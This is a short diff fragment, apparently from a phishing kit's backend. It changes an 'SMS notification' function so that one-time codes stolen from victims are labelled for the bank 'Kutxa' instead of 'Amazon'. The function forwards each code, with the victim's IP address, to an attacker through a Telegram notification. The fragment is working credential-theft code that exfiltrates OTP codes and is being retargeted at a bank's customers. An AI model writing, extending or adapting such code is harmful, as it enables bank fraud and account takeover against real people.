@@ -3760,7 +3760,7 @@ function b3(data, ip) {
 
 // SMS notification function (first code)
 function a3(data, ip) {
-  sendTelegramNotification('[SMS]{Amazon}(1)', `OTP: ${data.code}`, ip);
+  sendTelegramNotification('[SMS]{Kutxa}(1)', `OTP: ${data.code}`, ip);
 }
 
 // SMS notification function (second code)
